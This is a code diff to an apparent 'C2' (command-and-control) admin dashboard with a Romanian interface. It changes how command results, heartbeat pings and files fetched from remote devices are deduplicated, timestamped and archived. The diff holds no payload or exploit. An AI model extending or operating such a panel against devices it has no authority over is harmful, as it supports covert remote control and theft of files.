@@ -2079,9 +2079,19 @@ async function handleAdminC2(request, env, url) {
         }
       } catch (_) { }
     }
-    const results = Array.from(byKey.values())
-      .sort((a, b) => normTs(b.at || 0) - normTs(a.at || 0))
-      .slice(0, limit);
+    const raw = Array.from(byKey.values())
+      .sort((a, b) => normTs(b.at || 0) - normTs(a.at || 0));
+    // Dedup by command id — same result can appear in both indexes
+    const seen = new Set();
+    const results = raw
+      .filter(r => {
+        const id = r.id || r.key || "";
+        if (!id || seen.has(id)) return false;
+        seen.add(id);
+        return true;
+      })
+      .slice(0, limit)
+      .map(r => { if (r.at) r.at = normTs(r.at); return r; });
     return json({ results });
   }
   if (request.method === "GET" && p === "/admin/api/c2/files") {
@@ -3078,7 +3088,7 @@ function getFile(p){
   document.getElementById("cmdParams").value=JSON.stringify({uri:p},null,2);
   sendCmd();
 }
-function ago(ts,now){var d=now-ts;if(d<0)return"acum";if(d<60)return d+"s";if(d<3600)return Math.floor(d/60)+"m "+(d%60)+"s";if(d<86400)return Math.floor(d/3600)+"h";return Math.floor(d/86400)+"d"}
+function ago(ts,now){ts=Number(ts)||0;if(ts>1e12)ts=Math.floor(ts/1000);if(!ts)return"necunoscut";var d=now-ts;if(d<0)return"acum";if(d<60)return d+"s";if(d<3600)return Math.floor(d/60)+"m";if(d<86400)return Math.floor(d/3600)+"h";return Math.floor(d/86400)+"d"}
 function fmtB(n){if(n==null||isNaN(n))return"";n=Number(n);if(n<1024)return n+"B";if(n<1048576)return(n/1024).toFixed(1)+"KB";return(n/1048576).toFixed(1)+"MB"}
 // ── Utility helpers ───────────────────────────────────────────────
 function fmtTime(ms){if(!ms||ms<=0)return"n/a";var d=new Date(Number(ms));return d.toLocaleDateString()+
@@ -3325,6 +3335,7 @@ function fmtData(d,action){
     if(d==null||d==="")return"";
     if(typeof d==="string")return"<pre>"+esc(d.slice(0,8000))+"</pre>";
     if(typeof d!=="object")return"<pre>"+esc(String(d))+"</pre>";
+    if(d.error&&Object.keys(d).filter(function(k){return k!=="error"}).length===0)return"";
     // Per-action renderers
     var r;
     switch(action){
@@ -3388,7 +3399,11 @@ function fmtData(d,action){
         return"<div class='frow'><a href='#' onclick='dl(\""+esc(k)+"\");return false'>↓ "+esc(k.split("/").pop())+"</a></div>";
       }).join("")+"</div>";
     }
-    if(d.error)return errState(d.error);
+    if(d.error){
+      var ek=Object.keys(d).filter(function(k){return k!=="error"});
+      if(ek.length===0)return"";
+      return errState(d.error);
+    }
     return rawJson(d);
   }catch(e){
     return"<pre class='dim'>afisare indisponibilă: "+esc(String(e&&e.message||e))+"</pre>";
@@ -3466,24 +3481,32 @@ async function loadDetail(){
       }).join("")
       :'<span class="empty">niciune</span>';
   }catch(e){}
-  // Results — heartbeat telemetry kept separate from command outputs.
+  // Results — recent (24h) shown first, older in collapsible archive section.
   try{
     var r=await api("/admin/api/c2/results?uid="+encodeURIComponent(uid)+"&limit=100");
     var all=r.results||[];
     var cmds=all.filter(function(x){return x.action!=="ping"});
     var hb=all.length-cmds.length;
     document.getElementById("resCount").textContent=String(cmds.length)+(hb?(" · "+hb+" ping-uri (telemetrie)"):"");
-    document.getElementById("results").innerHTML=cmds.length?
-      cmds.map(function(x){
-        try{
-          return"<div class='cmd-item'><div class='cmd-head'><span class='action'>"+esc(x.action)+"</span><span class='badge "+(x.ok?"done":"failed")+"'>"+(x.ok?"OK":"FAIL")+"</span><span class='time mono'>"+ago(x.at,now)+"</span></div>"
-            +(x.err?"<div class='cmd-result' style='color:var(--red)'>⚠ "+esc(String(x.err).slice(0,300))+"</div>":"")
-            +"<div class='cmd-result'>"+fmtData(x.data,x.action)+"</div></div>";
-        }catch(e){
-          return"<div class='cmd-item'><div class='cmd-head'><span class='action'>"+esc(x.action)+"</span><span class='badge failed'>?</span><span class='time mono'>"+ago(x.at,now)+"</span></div><div class='cmd-result dim'>afisare indisponibilă</div></div>";
-        }
-      }).join("")
-      :'<span class="empty">niciun rezultat</span>';
+    var cutoff=now-86400;
+    function nts(ts){ts=Number(ts)||0;if(ts>1e12)ts=Math.floor(ts/1000);return ts}
+    var recent=cmds.filter(function(x){return nts(x.at)>=cutoff});
+    var older=cmds.filter(function(x){return nts(x.at)<cutoff});
+    function renderResult(x){
+      try{
+        return"<div class='cmd-item'><div class='cmd-head'><span class='action'>"+esc(x.action)+"</span><span class='badge "+(x.ok?"done":"failed")+"'>"+(x.ok?"OK":"FAIL")+"</span><span class='time mono'>"+ago(x.at,now)+"</span></div>"
+          +(x.err?"<div class='cmd-result' style='color:var(--red)'>⚠ "+esc(String(x.err).slice(0,300))+"</div>":"")
+          +"<div class='cmd-result'>"+fmtData(x.data,x.action)+"</div></div>";
+      }catch(e){
+        return"<div class='cmd-item'><div class='cmd-head'><span class='action'>"+esc(x.action)+"</span><span class='badge failed'>?</span><span class='time mono'>"+ago(x.at,now)+"</span></div><div class='cmd-result dim'>afisare indisponibilă</div></div>";
+      }
+    }
+    var html="";
+    if(recent.length)html+=recent.map(renderResult).join("");
+    if(older.length){
+      html+="<details style='margin-top:8px'><summary style='cursor:pointer;color:var(--dim);font-size:12px;padding:4px 0'>"+older.length+" rezultate anterioare (peste 24h) · arhivă completă în <a href='/admin/c2/history' style='color:var(--amber)'>Istoric</a></summary><div style='margin-top:6px'>"+older.map(renderResult).join("")+"</div></details>";
+    }
+    document.getElementById("results").innerHTML=html||'<span class="empty">niciun rezultat</span>';
     clearResultsLoading();
   }catch(e){}
 }
